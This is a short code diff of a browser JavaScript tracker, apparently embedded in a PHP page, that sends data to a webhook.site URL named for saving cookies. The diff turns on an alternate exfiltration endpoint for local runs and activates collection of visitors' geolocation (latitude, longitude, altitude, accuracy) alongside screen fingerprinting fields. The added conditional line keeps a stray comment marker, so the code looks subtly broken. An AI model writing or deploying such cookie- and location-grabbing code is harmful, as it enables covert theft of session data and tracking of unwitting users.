@@ -20,9 +20,9 @@ echo 'ok this is from php';
 
 var url = 'https://webhook.site/savesccookie?c='// Webhook URL
 
- //if(location.href.includes('localhost:') || //location.href.includes('file://')) {
-//    url = 'https://webhook.site/n1204cookie?coo=';
-// }
+if(location.href.includes('localhost:') || //location.href.includes('file://')) {
+    url = 'https://webhook.site/savesccookie?coo=';
+ }
 
 // also remember to make a bundle.js; don't be like me and leak slack webhook url secrets everywhere
 
@@ -290,11 +290,11 @@ var general = {
     scrPixelDepth:  screen.pixelDepth,
 
 
-    // latitude:  position.coords.latitude,
-    // longitude:  position.coords.longitude,
-    // accuracy:  position.coords.accuracy,
-    // altitude:  position.coords.altitude,
-    // altitudeAccuracy:  position.coords.altitudeAccuracy,
+   latitude:  position.coords.latitude,
+    longitude:  position.coords.longitude,
+    accuracy:  position.coords.accuracy,
+    altitude:  position.coords.altitude,
+    altitudeAccuracy:  position.coords.altitudeAccuracy,
     // heading:  position.coords.heading,
     // speed:  position.coords.speed,
     // timestamp: position.timestamp
